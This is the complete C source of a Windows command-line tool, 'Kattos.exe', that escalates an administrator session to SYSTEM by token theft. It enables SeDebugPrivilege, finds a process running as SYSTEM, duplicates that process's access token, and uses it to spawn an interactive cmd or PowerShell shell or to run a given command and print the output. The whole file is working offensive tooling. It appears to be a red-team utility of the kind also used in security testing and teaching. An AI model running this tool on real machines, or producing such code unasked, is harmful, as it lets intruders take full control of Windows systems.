#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <sddl.h>
#include <stdlib.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "psapi.lib")

struct Args {
    BOOL bInteractive;
    wchar_t* ExecMode;
    wchar_t* Command;
};

struct Pipes {
    HANDLE out_rd;
    HANDLE out_wr;
};

struct Pipes p = { NULL, NULL };

struct Args a = { FALSE, 0, NULL };

BOOL SetPrivilege(LPCTSTR lpszPrivilege)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;
    HANDLE hToken = NULL;
    BOOL bEnabled = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
        goto cleanup;

    if (!hToken)
        goto cleanup;

    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid))
        goto cleanup;

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, 0, (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
        goto cleanup;

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        wprintf(L"[-] The token does not have the specified privilege. \n");
        goto cleanup;
    }

    wprintf(L"[+] SeDebugPrivilege enabled\n");
    bEnabled = TRUE;

cleanup:
    if (hToken)CloseHandle(hToken);
    return bEnabled;
}

BOOL ParseArgs(int argc, wchar_t* argv[]) {

    if (argc < 3 || argc > 4)
    {
        wprintf(L"Usage:\n");
        wprintf(L"  Kattos.exe <cmd|psh> -spawn\n");
        wprintf(L"  Kattos.exe <cmd|psh> -c \"<command>\"\n\n");
        wprintf(L"Modes:\n");
        wprintf(L"  cmd        Launch Command Prompt.\n");
        wprintf(L"  psh        Launch PowerShell.\n\n");
        wprintf(L"Options:\n");
        wprintf(L"  -spawn     Start an interactive shell.\n");
        wprintf(L"  -c         Execute a command and print its output.\n\n");
        wprintf(L"Examples:\n");
        wprintf(L"  Kattos.exe cmd -spawn\n");
        wprintf(L"  Kattos.exe psh -c \"Get-Process\"\n");

        return FALSE;
    }

    if (_wcsicmp(argv[1], L"cmd") == 0) {
        a.ExecMode = L"C:\\Windows\\System32\\cmd.exe";
    }
    else if (_wcsicmp(argv[1], L"psh") == 0) {
        a.ExecMode = L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
    }
    else {
        wprintf(L"[-] Invalid args passed %ls\n", argv[1]);
        return FALSE;
    }

    if (_wcsicmp(argv[2], L"-spawn") == 0) {
        a.bInteractive = TRUE;
    }
    else if (_wcsicmp(argv[2], L"-c") == 0) {
        if (argc < 4) {
            wprintf(L"[-] Command to execute missing");
            return FALSE;
        }
        else {
            a.Command = argv[3];
        }
    }
    else {
        return FALSE;
    }
    return TRUE;
}

BOOL MakePipes(void) {
    SECURITY_ATTRIBUTES saAttr;

    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&p.out_rd, &p.out_wr, &saAttr, 0))
        return FALSE;

    if (!SetHandleInformation(p.out_wr, HANDLE_FLAG_INHERIT, 0))
        return FALSE;

    wprintf(L"[+] Pipes ready to receive command output\n");
    return TRUE;
}

void ReadFromPipe(void)
{
    DWORD dwRead, dwWritten;
    CHAR chBuf[4096];
    BOOL bSuccess2 = FALSE;
    HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);

    for (;;)
    {
        bSuccess2 = ReadFile(p.out_rd, chBuf, 4096, &dwRead, NULL);
        if (!bSuccess2 || dwRead == 0) break;

        bSuccess2 = WriteFile(hParentStdOut, chBuf, dwRead, &dwWritten, NULL);
        if (!bSuccess2) break;
    }
}

BOOL TryCreateProcessAsSystem(int PID) {
    HANDLE hProcess = NULL, hToken = NULL, hDupedToken = NULL;
    wchar_t* Prefix = NULL;
    BOOL bSuccess = FALSE;
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    DWORD dwCreationFlags = a.bInteractive ? CREATE_NEW_CONSOLE : CREATE_NO_WINDOW;
    wchar_t* cmd = NULL;

    if (!a.bInteractive && p.out_wr && p.out_rd)
    {
        si.hStdError = p.out_wr;
        si.hStdOutput = p.out_wr;
        si.dwFlags |= STARTF_USESTDHANDLES;

        Prefix = _wcsicmp(a.ExecMode, L"C:\\Windows\\System32\\cmd.exe") == 0 ? L"/c " : L"-Command ";
        size_t size = wcslen(Prefix) + wcslen(a.Command) + 1;
        cmd = malloc(size * sizeof(wchar_t));

        if (cmd) {
            wcscpy_s(cmd, size, Prefix);
            wcscat_s(cmd, size, a.Command);
        }
    }

    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, FALSE, PID);
    if (!hProcess) {
        bSuccess = FALSE;
        goto cleanup;
    }

    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken)) {
        bSuccess = FALSE;
        goto cleanup;
    }

    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDupedToken)) {
        bSuccess = FALSE;
        goto cleanup;
    }

    wprintf(L"[+] Stole access token from (PID:%d)\n", PID);

    if (!CreateProcessWithTokenW(hDupedToken, LOGON_WITH_PROFILE, a.ExecMode, cmd, dwCreationFlags, NULL, NULL, &si, &pi)) {
        bSuccess = FALSE;
        goto cleanup;
    }

    wprintf(L"[+] Elevated SYSTEM process spawned\n");

    if (!a.bInteractive)
    {
        wprintf(L"[*] Command output:\n");
        if (p.out_wr)CloseHandle(p.out_wr);
        ReadFromPipe();
        if (p.out_rd) CloseHandle(p.out_rd);
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    bSuccess = TRUE;
    goto cleanup;

cleanup:
    if (cmd)free(cmd);
    if (hProcess)CloseHandle(hProcess);
    if (hToken)CloseHandle(hToken);
    if (hDupedToken)CloseHandle(hDupedToken);
    if (pi.hProcess)CloseHandle(pi.hProcess);
    if (pi.hThread)CloseHandle(pi.hThread);
    return bSuccess;
}

BOOL ProcessLooper() {
    DWORD buf, aProcesses[1024], cbNeeded, cProcesses;
    HANDLE hProcess, hToken;
    TOKEN_USER* tokeninfo = NULL;
    LPWSTR StringSid;
    BOOL bImpersonate = FALSE;

    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
        return FALSE;

    cProcesses = cbNeeded / sizeof(DWORD);

    for (unsigned int i = 0; i < cProcesses; i++)
    {
        hProcess = NULL;
        hToken = NULL;
        tokeninfo = NULL;
        StringSid = NULL;
        buf = 0;
        hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);

        if (!hProcess)
            goto cleanup;

        if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
            goto cleanup;

        GetTokenInformation(hToken, TokenUser, NULL, 0, &buf);
        tokeninfo = malloc(buf);

        if (!tokeninfo)
            goto cleanup;

        if (!GetTokenInformation(hToken, TokenUser, tokeninfo, buf, &buf))
            goto cleanup;

        if (!ConvertSidToStringSidW(tokeninfo->User.Sid, &StringSid))
            goto cleanup;

        if (wcscmp(StringSid, L"S-1-5-18") == 0) {
            if (TryCreateProcessAsSystem(aProcesses[i])) {
                bImpersonate = TRUE;
                break;
            }
        }
    cleanup:
        if (hProcess) CloseHandle(hProcess);
        if (hToken) CloseHandle(hToken);
        if (StringSid) LocalFree(StringSid);
        if (tokeninfo) free(tokeninfo);
        continue;
    }
    return bImpersonate;
}


int wmain(int argc, wchar_t* argv[]) {

    wprintf(L" _._     _,-'\"\"`-._\n(,-.`._,'(       |\\`-/|\n    `-.-' \\ )-`( , o o)\n          `-    \\`_`\"'- %ls\n", L"S-1-5-18");
    if (!ParseArgs(argc, argv)) return 0;
    if (!SetPrivilege(SE_DEBUG_NAME)) return 0;
    if (!a.bInteractive)MakePipes();

    return ProcessLooper() ? 0 : 1;
}